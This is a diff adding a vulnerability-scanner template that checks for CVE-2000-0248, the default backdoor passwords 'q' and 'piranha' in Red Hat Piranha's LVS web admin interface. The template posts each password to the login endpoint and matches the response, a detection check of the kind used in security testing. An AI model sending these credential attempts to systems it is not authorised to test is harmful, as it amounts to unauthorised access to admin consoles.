@@ -1,0 +1,72 @@
+[info]
+author = "ave"
+description = "Red Hat Linux Piranha 软件中 LVS Web 管理界面存在默认后门密码（piranha/q 或 piranha/piranha），攻击者可远程登录并执行任意命令。本 PoC 通过向 /piranha/ 登录接口提交默认凭据，检测目标是否使用出厂默认口令。"
+id = "POC-AVE-2000-0709"
+name = "CVE-2000-0248 Piranha 默认后门密码 PoC"
+severity = "critical"
+tags = ["ave-2000-0709"]
+vuln_id = [
+    "CVE-2000-0248",
+    "AVE-2000-0709",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/piranha/secure/passwd.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "piranha_pass=q"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Welcome",
+    "Control",
+    "LVS",
+    "piranha",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/piranha/secure/passwd.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "piranha_pass=piranha"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Welcome",
+    "Control",
+    "LVS",
+    "piranha",
+]
